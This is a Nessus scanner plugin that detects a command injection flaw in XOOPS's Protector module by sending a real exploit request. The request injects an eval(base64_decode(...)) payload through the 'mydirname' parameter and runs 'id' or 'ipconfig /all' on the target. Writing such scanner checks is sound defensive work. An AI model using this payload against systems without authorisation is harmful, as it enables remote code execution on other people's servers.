#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(35326);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(33176);
  script_xref(name:"milw0rm", value:"7705");
  script_xref(name:"OSVDB", value:"51444");
  script_xref(name:"OSVDB", value:"51445");
  script_xref(name:"OSVDB", value:"51446");
  script_xref(name:"OSVDB", value:"51447");

  script_name(english:"XOOPS Multiple Scripts mydirname Parameter Arbitrary Command Injection");
  script_summary(english:"Tries to run a command");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
command injection attacks." );
 script_set_attribute(attribute:"description", value:
"The version of XOOPS installed on the remote host fails to filter
user-supplied input to the 'mydirname' parameter of the
'onupdate.php', 'notification.php', and 'oninstall.php' scripts under
the application's 'xoops_lib/modules/protector' directory before
passing it to PHP 'eval()' functions.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
exploit these issues to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Commands to try to run.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";


# Scripts to check.
if (thorough_tests) 
{
  files = make_list(
    "onupdate.php",
    "notification.php",
    "oninstall.php"
  );
}
else 
{
  files = make_list("onupdate.php");
}


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit an issue to run a command.
  foreach file (files)
  {
    foreach cmd (cmds)
    {
      var = string("NESSUS_CMD_", toupper(rand_str()));
      exploit = string("eval(base64_decode($_SERVER[HTTP_", var, "]));");

      url = string(
        dir, "/xoops_lib/modules/protector/", file, "?",
        "mydirname=a(){}", exploit, "function%20v"
      );

      req = http_mk_get_req(
        port        : port,
        item        : url, 
        add_headers : make_array(var, base64(str:string("system('", cmd, "');")))
      );
      res = http_send_recv_req(port:port, req:req);
      if (res == null) exit(0);

      # There's a problem if we see the expected command output.
      if ('ipconfig' >< exploit) pat = cmd_pats['ipconfig'];
      else pat = cmd_pats['id'];

      if (egrep(pattern:pat, string:res[2]))
      {
        if (report_verbosity > 0)
        {
          req_str = http_mk_buffer_from_req(req:req);
          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote \n",
            "host using the following request :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:req_str)
          );
          if (report_verbosity > 1)
          {
            output = res[2];
            report = string(
              report,
              "\n",
              "It produced the following output :\n",
              "\n",
              "  ", str_replace(find:'\n', replace:'\n  ', string:output), "\n"
            );
          }
          security_warning(port:port, extra:report);
        }
        else security_warning(port);

        exit(0);
      }
    }
  }
}
